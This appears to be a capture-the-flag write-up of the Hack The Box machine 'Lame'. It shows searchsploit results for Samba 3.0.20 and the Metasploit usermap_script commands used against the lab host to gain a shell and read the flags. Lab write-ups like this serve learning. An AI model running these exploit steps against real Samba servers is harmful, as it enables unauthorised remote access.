# lame

This box was a very simple box that infact has the most solves in hack the box proving its difficulty that only involved a
simple search for exploits and then we use a metasploit module and get a shell.

>skills involved in this box
- enumeration
- metasploit

# USER & ROOT

After running our nmap scan we see that there is port 21 open and 445 running samba.

Trying to exploit the ftp service via a backdoor with `vsftpd 2.3.4` but it turned out to be a loop hole.

However the scan shows the samba version is `smbd 3.0.20-Debian` so we look for an exploit using searchsploit.
```
searchsploit samba 3.0.20
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                           | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                            | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                            | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                    | linux_x86/dos/36741.py
--------------------------------------------------------------------------------- -------------------------------
```
We take a look at teh metasploit module:
```
use exploit/multi/samba/usermap_script
```
All we have to do is `set RHOSTS 10.10.10.3` for configuring the options and then we `run` the exploit.

After this we get a shell.

We simply run a few enumeration commands and find the user flag in `/home/makis/user.txt`

The root flag is in `/root/root.txt` like always.

Thanks for reading hope it was worth the read.

